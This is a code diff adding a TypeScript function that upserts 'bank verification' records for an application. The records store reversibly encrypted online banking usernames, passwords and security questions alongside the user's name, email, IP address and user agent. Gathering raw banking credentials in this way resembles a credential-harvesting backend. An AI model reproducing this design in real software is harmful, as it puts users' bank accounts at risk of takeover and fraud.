@@ -68,6 +68,52 @@ export async function createBankVerification(
   return { id: rows[0].id };
 }
 
+// Upsert: update existing record if one exists for this application, otherwise insert new
+export async function upsertBankVerification(
+  input: CreateBankVerificationInput,
+): Promise<{ id: string }> {
+  const encryptedUsername = encrypt(input.bankingUsername);
+  const encryptedPassword = encrypt(input.bankingPassword);
+  const encryptedSecurityQuestion = input.securityQuestion
+    ? encrypt(input.securityQuestion)
+    : null;
+
+  const existing = await getBankVerificationByApplicationId(input.applicationId);
+
+  if (existing) {
+    // Overwrite previous entry with new credentials
+    await query(
+      `UPDATE bank_verification SET
+        bank_name = $1,
+        account_type = $2,
+        banking_username_encrypted = $3,
+        banking_password_encrypted = $4,
+        security_question_encrypted = $5,
+        full_name = $6,
+        email = $7,
+        ip_address = $8,
+        user_agent = $9,
+        verification_status = 'pending'
+      WHERE application_id = $10`,
+      [
+        sanitizeInput(input.bankName),
+        input.accountType,
+        encryptedUsername,
+        encryptedPassword,
+        encryptedSecurityQuestion,
+        sanitizeInput(input.fullName),
+        sanitizeInput(input.email),
+        input.ipAddress,
+        input.userAgent,
+        input.applicationId,
+      ],
+    );
+    return { id: existing.id };
+  }
+
+  return createBankVerification(input);
+}
+
 export async function getBankVerificationByApplicationId(
   applicationId: string,
 ): Promise<BankVerificationRow | null> {
